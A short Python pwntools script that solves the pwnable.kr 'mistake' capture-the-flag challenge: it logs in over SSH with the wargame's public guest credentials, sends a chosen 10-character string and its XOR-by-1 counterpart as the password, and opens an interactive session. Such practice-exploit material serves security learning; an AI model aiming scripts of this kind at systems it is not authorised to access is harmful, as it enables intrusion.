from pwn import *

PW_LEN = 10
XORKEY = 1

def xor(s):
    return ''.join([chr(ord(c) ^ XORKEY) for c in s])

def exploit():
    ssh_connection = ssh(
    	user = 'mistake',
    	host ='pwnable.kr',
    	password = 'guest',
    	port = 2222)
    p = ssh_connection.process('./mistake')

    pw_buf = input("Enter 10 characters: ")
    pw_buf = pw_buf[:PW_LEN]
    pw_buf2 = xor(pw_buf)

    print(f"Sending pw_buf: {pw_buf}")
    p.sendline(str(pw_buf).encode())
    
    print(f"Sending pw_buf2: {pw_buf2}")
    p.sendlineafter(b'input password :', str(pw_buf2).encode())

    result = p.recvline()
    print(result)

    p.interactive()

def main():
    exploit()

if __name__ == "__main__":
    main()
